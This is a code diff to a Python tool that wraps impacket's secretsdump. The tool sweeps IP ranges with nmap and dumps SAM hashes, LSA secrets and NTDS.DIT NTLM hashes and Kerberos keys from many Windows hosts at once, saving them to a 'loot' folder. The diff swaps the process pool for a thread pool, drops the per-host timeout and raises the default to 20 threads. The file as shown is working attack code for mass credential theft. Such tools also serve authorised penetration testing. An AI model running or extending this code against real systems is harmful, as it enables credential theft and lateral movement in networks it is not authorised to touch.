@@ -65,20 +65,19 @@ from impacket import version
 from impacket.examples import logger
 from impacket.examples.utils import parse_target
 from impacket.smbconnection import SMBConnection
+from concurrent.futures import ThreadPoolExecutor
 
 from impacket.examples.secretsdump import LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes, \
     KeyListSecrets
 from impacket.krb5.keytab import Keytab
+
 try:
     input = raw_input
 except NameError:
     pass
-try:
-    from pebble import ProcessPool
-except:
-    print("Error: Pebble is not installed you can install it with python3 -m pip install pebble")
-    sys.exit(0)
-    
+
+
+
 from datetime import datetime
 import socket
 import time
@@ -89,14 +88,13 @@ except:
     print("Error: Python Nmap is not installed you can install it with python3 -m pip install python-nmap")
     sys.exit(0)
 
-
 cwd = os.path.abspath(os.path.dirname(__file__))
 
 today = datetime.now()
 hour = today.strftime("%H")
 
 ltime = time.localtime(time.time())
-timestamp = '%s-%s-%s_%s-%s-%s' % (str(ltime.tm_year).zfill(2), str(ltime.tm_mon).zfill(2), str(ltime.tm_mday).zfill(2),  str(hour).zfill(2), str(ltime.tm_min).zfill(2), str(ltime.tm_sec).zfill(2))
+timestamp = '%s-%s-%s_%s-%s-%s' % (str(ltime.tm_year).zfill(2), str(ltime.tm_mon).zfill(2), str(ltime.tm_mday).zfill(2), str(hour).zfill(2), str(ltime.tm_min).zfill(2), str(ltime.tm_sec).zfill(2))
 
 print(timestamp)
 
@@ -108,6 +106,7 @@ color_BLU = '\033[94m'
 color_PURP = '\033[35m'
 color_reset = '\033[0m'
 green_plus = "{}[+]{}".format(color_GRE, color_reset)
+
 
 class DumpSecrets:
     def __init__(self, ip, username='', password='', domain='', options=None):
@@ -143,7 +142,7 @@ class DumpSecrets:
         self.__justDCNTLM = options.just_dc_ntlm
         self.__justUser = options.just_dc_user
         self.__pwdLastSet = options.pwd_last_set
-        self.__printUserStatus= options.user_status
+        self.__printUserStatus = options.user_status
         self.__resumeFileName = options.resumefile
         self.__canProcessSAMLSA = True
         self.__kdcHost = options.dc_ip
@@ -169,7 +168,7 @@ class DumpSecrets:
                     localOperations = LocalOperations(self.__systemHive)
                     bootKey = localOperations.getBootKey()
                     if self.__ntdsFile is not None:
-                    # Let's grab target's configuration about LM Hashes storage
+                        # Let's grab target's configuration about LM Hashes storage
                         self.__noLMHash = localOperations.checkNoLMHashPolicy()
                 else:
                     import binascii
@@ -191,7 +190,7 @@ class DumpSecrets:
                         else:
                             raise
 
-                    self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost)
+                    self.__remoteOps = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost)
                     self.__remoteOps.setExecMethod(self.__options.exec_method)
                     if self.__justDC is False and self.__justDCNTLM is False and self.__useKeyListMethod is False or self.__useVSSMethod is True:
                         self.__remoteOps.enableRegistry()
@@ -201,7 +200,7 @@ class DumpSecrets:
                 except Exception as e:
                     self.__canProcessSAMLSA = False
                     if str(e).find('STATUS_USER_SESSION_DELETED') and os.getenv('KRB5CCNAME') is not None \
-                        and self.__doKerberos is True:
+                            and self.__doKerberos is True:
                         # Giving some hints here when SPN target name validation is set to something different to Off
                         # This will prevent establishing SMB connections using TGS for SPNs different to cifs/
                         logging.error('Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user')
@@ -224,7 +223,7 @@ class DumpSecrets:
                         else:
                             SAMFileName = self.__samHive
 
-                        self.__SAMHashes = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)
+                        self.__SAMHashes = SAMHashes(SAMFileName, bootKey, isRemote=self.__isRemote)
                         self.__SAMHashes.dump()
                         if self.__outputFileName is not None:
                             self.__SAMHashes.export(self.__outputFileName)
@@ -280,7 +279,7 @@ class DumpSecrets:
                                                useVSSMethod=self.__useVSSMethod, justNTLM=self.__justDCNTLM,
                                                pwdLastSet=self.__pwdLastSet, resumeSession=self.__resumeFileName,
                                                outputFileName=self.__outputFileName, justUser=self.__justUser,
-                                               printUserStatus= self.__printUserStatus)
+                                               printUserStatus=self.__printUserStatus)
                 try:
                     self.__NTDSHashes.dump()
                 except Exception as e:
@@ -294,7 +293,7 @@ class DumpSecrets:
                         if resumeFile is not None:
                             os.unlink(resumeFile)
                     logging.error(e)
-                    if self.__justUser and str(e).find("ERROR_DS_NAME_ERROR_NOT_UNIQUE") >=0:
+                    if self.__justUser and str(e).find("ERROR_DS_NAME_ERROR_NOT_UNIQUE") >= 0:
                         logging.info("You just got that error because there might be some duplicates of the same name. "
                                      "Try specifying the domain name for the user as well. It is important to specify it "
                                      "in the form of NetBIOS domain name/user (e.g. contoso/Administratror).")
@@ -309,7 +308,7 @@ class DumpSecrets:
             if self.__NTDSHashes is not None:
                 if isinstance(e, KeyboardInterrupt):
                     while True:
-                        answer =  input("Delete resume session file? [y/N] ")
+                        answer = input("Delete resume session file? [y/N] ")
                         if answer.upper() == '':
                             answer = 'N'
                             break
@@ -342,8 +341,7 @@ class DumpSecrets:
             self.__KeyListSecrets.finish()
 
 
-
-def do_ip(inpu, local_ip): # check if the inputted ips are up so we dont scan thigns we dont need to
+def do_ip(inpu, local_ip):  # check if the inputted ips are up so we dont scan thigns we dont need to
     print('\n[scanning hosts]')
     scanner = nmap.PortScanner()
     if os.path.isfile(inpu):  # if its in a file the arguments are different
@@ -361,7 +359,8 @@ def do_ip(inpu, local_ip): # check if the inputted ips are up so we dont scan th
 
     return uphosts
 
-def get_ip(): # Thanks fatal_error on stackoverflow post https://stackoverflow.com/questions/166506/finding-local-ip-addresses-using-pythons-stdlib
+
+def get_ip():  # Thanks fatal_error on stackoverflow post https://stackoverflow.com/questions/166506/finding-local-ip-addresses-using-pythons-stdlib
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.settimeout(0)
     try:
@@ -373,7 +372,8 @@ def get_ip(): # Thanks fatal_error on stackoverflow post https://stackoverflow.c
         s.close()
     return IP
 
-def mt_execute(ip, uname, passwd, dom, opt): # multithreading requires a function
+
+def mt_execute(ip, uname, passwd, dom, opt):  # multithreading requires a function
     print("{} Attacking {}".format(green_plus, ip))
 
     dumper = DumpSecrets(ip, uname, passwd, dom, opt)
@@ -390,7 +390,7 @@ def mt_execute(ip, uname, passwd, dom, opt): # multithreading requires a functio
 # Process command-line arguments.
 if __name__ == '__main__':
 
-    if os.name == 'nt': #Check for Windows since this tool is multiplatform
+    if os.name == 'nt':  # Check for Windows since this tool is multiplatform
         if os.path.isdir(cwd + r"\loot") == False:
             os.makedirs(cwd + r"\loot")
     else:
@@ -404,8 +404,8 @@ if __name__ == '__main__':
 
     print(version.BANNER)
 
-    parser = argparse.ArgumentParser(add_help = True, description = "Performs various techniques to dump secrets from "
-                                                      "the remote machine without executing any agent there.")
+    parser = argparse.ArgumentParser(add_help=True, description="Performs various techniques to dump secrets from "
+                                                                "the remote machine without executing any agent there.")
 
     parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address, filename with ips> or LOCAL'
                                                        ' (if you want to parse local files)')
@@ -417,8 +417,8 @@ if __name__ == '__main__':
     parser.add_argument('-sam', action='store', help='SAM hive to parse')
     parser.add_argument('-ntds', action='store', help='NTDS.DIT file to parse')
     parser.add_argument('-resumefile', action='store', help='resume file name to resume NTDS.DIT session dump (only '
-                         'available to DRSUAPI approach). This file will also be used to keep updating the session\'s '
-                         'state')
+                                                            'available to DRSUAPI approach). This file will also be used to keep updating the session\'s '
+                                                            'state')
     parser.add_argument('-outputfile', action='store',
                         help='base output filename. Extensions will be added for sam, secrets, cached and ntds')
     parser.add_argument('-use-vss', action='store_true', default=False,
@@ -428,43 +428,43 @@ if __name__ == '__main__':
     parser.add_argument('-use-keylist', action='store_true', default=False,
                         help='Use the Kerb-Key-List method instead of default DRSUAPI')
     parser.add_argument('-exec-method', choices=['smbexec', 'wmiexec', 'mmcexec'], nargs='?', default='smbexec', help='Remote exec '
-                        'method to use at target (only when using -use-vss). Default: smbexec')
-    parser.add_argument('-threads', action='store', type=int, default=10, help='Number of threads to use Default=10')
-    parser.add_argument('-timeout', action='store', type=int, default=60, help='Set the timeout in seconds for each thread default=60')
+                                                                                                                      'method to use at target (only when using -use-vss). Default: smbexec')
+    parser.add_argument('-threads', action='store', type=int, default=20, help='Number of threads to use Default=20')
+
 
     group = parser.add_argument_group('display options')
     group.add_argument('-just-dc-user', action='store', metavar='USERNAME',
                        help='Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. '
                             'Implies also -just-dc switch')
     group.add_argument('-just-dc', action='store_true', default=False,
-                        help='Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)')
+                       help='Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)')
     group.add_argument('-just-dc-ntlm', action='store_true', default=False,
                        help='Extract only NTDS.DIT data (NTLM hashes only)')
     group.add_argument('-pwd-last-set', action='store_true', default=False,
                        help='Shows pwdLastSet attribute for each NTDS.DIT account. Doesn\'t apply to -outputfile data')
     group.add_argument('-user-status', action='store_true', default=False,
-                        help='Display whether or not the user is disabled')
+                       help='Display whether or not the user is disabled')
     group.add_argument('-history', action='store_true', help='Dump password history, and LSA secrets OldVal')
 
     group = parser.add_argument_group('authentication')
     group.add_argument('-localauth', action='store_true', default=False, help='Authenticate with a local account to the machine')
-    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
+    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
     group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
     group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
-                             '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use'
-                             ' the ones specified in the command line')
-    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication'
-                                                                            ' (128 or 256 bits)')
+                                                       '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use'
+                                                       ' the ones specified in the command line')
+    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication'
+                                                                          ' (128 or 256 bits)')
     group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')
 
     group = parser.add_argument_group('connection')
-    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
-                                 'ommited it use the domain part (FQDN) specified in the target parameter')
+    group.add_argument('-dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller. If '
+                                                                            'ommited it use the domain part (FQDN) specified in the target parameter')
     group.add_argument('-target-ip', action='store', metavar="ip address",
                        help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                             'This is useful when target is the NetBIOS name and you cannot resolve it')
 
-    if len(sys.argv)==1:
+    if len(sys.argv) == 1:
         parser.print_help()
         sys.exit(1)
 
@@ -541,19 +541,19 @@ if __name__ == '__main__':
 
     print('Total targets: {}'.format(len(addresses)))
 
-    with ProcessPool(max_workers=options.threads) as thread_exe:
+    with ThreadPoolExecutor(max_workers=options.threads) as executor:
         for ip in addresses:
             if options.localauth:
                 domain = ip
             try:
-                out = thread_exe.schedule(mt_execute, (ip, username, password, domain, options,), timeout=options.timeout)
+                out = executor.submit(mt_execute, ip, username, password, domain, options)
             except Exception as e:
                 if logging.getLogger().level == logging.DEBUG:
                     import traceback
+
                     traceback.print_exc()
                 logging.error(str(e))
                 continue
             except KeyboardInterrupt as e:
                 continue
-
 
